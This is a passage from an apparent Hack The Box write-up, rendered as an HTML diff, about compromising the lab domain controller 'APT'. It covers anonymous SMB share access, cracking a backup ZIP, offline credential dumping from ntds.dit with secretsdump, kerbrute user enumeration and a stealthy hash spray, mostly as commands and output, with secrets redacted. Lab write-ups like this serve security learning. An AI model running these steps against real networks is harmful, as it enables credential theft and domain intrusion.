+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>mc-nmf<span class="w">       </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a><span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">         </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a><span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a><span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a><span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a><span class="m">49669</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a><span class="m">49670</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a><span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a><span class="m">49685</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a><span class="m">52410</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>APT<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a>
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>.1.1:
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a><span class="p">|</span><span class="w"> </span>smb-security-mode:
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a><span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>&lt;blank&gt;
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a><span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a><span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a><span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>required
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>-7m59s,<span class="w"> </span>deviation:<span class="w"> </span>22m40s,<span class="w"> </span>median:<span class="w"> </span>33s
+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a><span class="p">|</span><span class="w"> </span>smb-os-discovery:
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a><span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">6</span>.3<span class="o">)</span>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a><span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>apt
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a><span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>APT<span class="se">\x</span><span class="m">00</span>
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a><span class="p">|</span><span class="w">   </span>Domain<span class="w"> </span>name:<span class="w"> </span>htb.local
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a><span class="p">|</span><span class="w">   </span>Forest<span class="w"> </span>name:<span class="w"> </span>htb.local
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a><span class="p">|</span><span class="w">   </span>FQDN:<span class="w"> </span>apt.htb.local
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a><span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2026</span>-03-31T03:56:24+01:00
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a><span class="p">|</span><span class="w"> </span>smb2-time:
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2026</span>-03-31T02:56:27
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2026</span>-03-31T01:28:18
+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">84</span>.58<span class="w"> </span>seconds
+</code></pre></div>
+<p>We're dealing with a <strong>Windows Server 2016</strong> Domain Controller for the domain <code>htb.local</code>. The hostname is <code>APT</code>.</p>
+<hr />
+<h2 id="smb-enumeration-anonymous-share-access">SMB Enumeration — Anonymous Share Access<a class="headerlink" href="#smb-enumeration-anonymous-share-access" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>htb.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:APT<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:htb.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>Null<span class="w"> </span>Auth:True<span class="o">)</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>htb.local<span class="se">\:</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>backup<span class="w">          </span>READ
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>IPC$<span class="w">                            </span>Remote<span class="w"> </span>IPC
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>NETLOGON<span class="w">                        </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>SYSVOL<span class="w">                          </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="sb">```</span>
+</code></pre></div>
+<p>Anonymous access is allowed and we have <strong>READ</strong> permission on a <code>backup</code> share. Let's download what's inside.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>smbclient.py<span class="w"> </span><span class="s1">'htb.local/'</span>:<span class="s1">''</span>@dead:beef::b885:d62a:d679:573f
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># use backup</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># ls</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span>backup.zip<span class="w">   </span><span class="m">10650961</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">04</span>:31:03<span class="w"> </span><span class="m">2020</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># get backup.zip</span>
+</code></pre></div>
+<hr />
+<h2 id="cracking-the-backup-zip">Cracking the Backup ZIP<a class="headerlink" href="#cracking-the-backup-zip" title="Permanent link">&para;</a></h2>
+<p>The ZIP is password-protected. We extract its hash with <code>zip2john</code> and crack it with John the Ripper:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>zip2john<span class="w"> </span>backup.zip<span class="w"> </span>&gt;<span class="w"> </span>backup_hash
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>cat<span class="w"> </span>backup_hash<span class="w"> </span>-p
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>backup.zip:<span class="nv">$pkzip2$3</span>*1*1*0*8*24*9beb*9ac6*0f135e8d5f0&lt;REDACTED_HASH&gt;
+</code></pre></div>
+<p>After clean the hash we cracking the passwd.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>john backup_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Using default input encoding: UTF-8
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Loaded 1 password hash (PKZIP [32/64])
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Will run 16 OpenMP threads
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Press 'q' or Ctrl-C to abort, almost any other key for status
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>&lt;REDACTED&gt;   (backup.zip)
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>1g 0:00:00:00 DONE (2026-03-31 00:15) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..dumbo
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>Use the "--show" option to display all of the cracked passwords reliably
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>Session completed
+</code></pre></div></p>
+<p>Now we extract it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>unzip<span class="w"> </span>backup.zip
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Archive:<span class="w">  </span>backup.zip
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">   </span>creating:<span class="w"> </span>Active<span class="w"> </span>Directory/
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="o">[</span>backup.zip<span class="o">]</span><span class="w"> </span>Active<span class="w"> </span>Directory/ntds.dit<span class="w"> </span>password:
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">  </span>inflating:<span class="w"> </span>Active<span class="w"> </span>Directory/ntds.dit
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">  </span>inflating:<span class="w"> </span>Active<span class="w"> </span>Directory/ntds.jfm
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">  </span>inflating:<span class="w"> </span>registry/SECURITY
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">  </span>inflating:<span class="w"> </span>registry/SYSTEM
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>ls<span class="w"> </span>Active<span class="se">\ </span>Directory/
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="w">  </span>ntds.dit<span class="w">   </span>ntds.jfm
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>ls<span class="w"> </span>registry/
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">  </span>SECURITY<span class="w">   </span>SYSTEM
+</code></pre></div>
+<p>We have the three files needed to dump the entire domain: <code>ntds.dit</code>, <code>SYSTEM</code>, and <code>SECURITY</code>.</p>
+<hr />
+<h2 id="offline-ntds-dump-with-secretsdumppy">Offline NTDS Dump with secretsdump.py<a class="headerlink" href="#offline-ntds-dump-with-secretsdumppy" title="Permanent link">&para;</a></h2>
+<p>With <code>ntds.dit</code> + <code>SYSTEM</code> + <code>SECURITY</code>, we can extract all domain credentials offline without touching the live DC:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>secretsdump.py<span class="w"> </span>-ntds<span class="w"> </span><span class="s2">"Active Directory/ntds.dit"</span><span class="w"> </span>-system<span class="w"> </span>registry/SYSTEM<span class="w"> </span>-security<span class="w"> </span>registry/SECURITY<span class="w"> </span>LOCAL
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>system<span class="w"> </span>bootKey:<span class="w"> </span>0x936ce5da88593206567f650411e1d16b
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>cached<span class="w"> </span>domain<span class="w"> </span>logon<span class="w"> </span>information<span class="w"> </span><span class="o">(</span>domain/username:hash<span class="o">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>LSA<span class="w"> </span>Secrets
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>MACHINE.ACCMACHINE.ACC:plain_password_hex:34005b&lt;REDACTED_HASH&gt;
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>MACHINE.ACC:<span class="w"> </span>aad3b4&lt;REDACTED_HASH&gt;:b30027&lt;REDACTED_HASH&gt;
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DefaultPassword
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="o">(</span>Unknown<span class="w"> </span>User<span class="o">)</span>:&lt;REDACTED&gt;
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DPAPI_SYSTEM
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>dpapi_machinekey:0x3e0d78&lt;REDACTED_HASH&gt;
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>dpapi_userkey:0xdcde3f&lt;REDACTED_HASH&gt;
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>NLKM:734f34&lt;REDACTED_HASH&gt;
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Searching<span class="w"> </span><span class="k">for</span><span class="w"> </span>pekList,<span class="w"> </span>be<span class="w"> </span>patient
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>PEK<span class="w"> </span><span class="c1"># 0 found and decrypted: 1733ad&lt;REDACTED_HASH&gt;</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Reading<span class="w"> </span>and<span class="w"> </span>decrypting<span class="w"> </span>hashes<span class="w"> </span>from<span class="w"> </span>Active<span class="w"> </span>Directory/ntds.dit
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>Administrator:500:aad3b4&lt;REDACTED_HASH&gt;:2b576a&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>Guest:501:aad3b4&lt;REDACTED_HASH&gt;:31d6cf&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>DefaultAccount:503:aad3b4&lt;REDACTED_HASH&gt;:31d6cf&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a>APT:1000:aad3b4&lt;REDACTED_HASH&gt;:b30027&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a>krbtgt:502:aad3b4&lt;REDACTED_HASH&gt;:727919&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a>
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a>jeb.sloan:3200:aad3b4&lt;REDACTED_HASH&gt;:9ea25a&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a>&lt;<span class="m">1999</span><span class="w"> </span>users<span class="w"> </span>total&gt;
+</code></pre></div>
+<p>We found a cleartext password <code>&lt;REDACTED&gt;</code> in the LSA secrets, and 1999 domain user hashes. However, this is a <strong>backup from September 2020</strong> — passwords may have changed since then. We need to figure out which users are still valid.</p>
+<hr />
+<h2 id="user-validation-via-kerbrute">User Validation via Kerbrute<a class="headerlink" href="#user-validation-via-kerbrute" title="Permanent link">&para;</a></h2>
+<p>We try a password spray with <code>&lt;REDACTED&gt;</code> first,no luck. Since port 88 (Kerberos) is open, we use <code>kerbrute</code> to validate which users from the dump still exist in the domain:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>./kerbrute_linux_amd64<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>htb.local<span class="w"> </span>--dc<span class="w"> </span>apt6.htb<span class="w"> </span>users.txt
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w"> </span>Administrator@htb.local
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w"> </span>henry.vinson@htb.local
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Done!<span class="w"> </span>Tested<span class="w"> </span><span class="m">1999</span><span class="w"> </span>usernames<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>valid<span class="o">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1097</span>.224<span class="w"> </span>seconds
+</code></pre></div>
+<p>Only two valid users: <code>Administrator</code> and <code>henry.vinson</code>. The rest of the accounts from the 2020 backup no longer exist.</p>
+<hr />
+<h2 id="ntlm-hash-spray-against-henryvinson">NTLM Hash Spray Against henry.vinson<a class="headerlink" href="#ntlm-hash-spray-against-henryvinson" title="Permanent link">&para;</a></h2>
+<p>We find henry.vinson's hash from the dump:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>henry.vinson:3647:aad3b435&lt;REDACTED_HASH&gt;:::
+</code></pre></div>
+<p>We test it directly, but it fails:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'&lt;REDACTED_HASH&gt;'</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:APT<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:htb.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>Null<span class="w"> </span>Auth:True<span class="o">)</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>htb.local<span class="se">\h</span>enry.vinson:&lt;REDACTED_HASH&gt;<span class="w"> </span>STATUS_LOGON_FAILURE
+</code></pre></div>
+<p>The hash from 2020 is no longer valid. But here's the key insight: maybe henry.vinson is now using a password that matches another user's hash from the old dump. We extract all 1999 NTLM hashes and spray each one against henry.vinson via Kerberos.
+<strong>Technical Note:</strong> We performed the hash spray via Kerberos Pre-Authentication instead of traditional SMB for two reasons: speed and stealth. Kerberos is significantly faster and often generates less noise in event logs (Event ID 4768 for Kerberos vs Event ID 4625 for SMB). Furthermore, it allows us to validate credentials by simply requesting a TGT, without needing to establish a full connection to the file system (SMB shares).</p>
+<p>Wisp me on LinkedIn if you'd like to check out the script or discuss the logic!</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>awk<span class="w"> </span>-F<span class="w"> </span><span class="s2">":"</span><span class="w"> </span><span class="s1">'/^[a-zA-Z0-9._-]+:[0-9]+:/ {print $4}'</span><span class="w"> </span>secretsdump.txt<span class="w"> </span>&gt;<span class="w"> </span>hashes_ntlm.txt
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
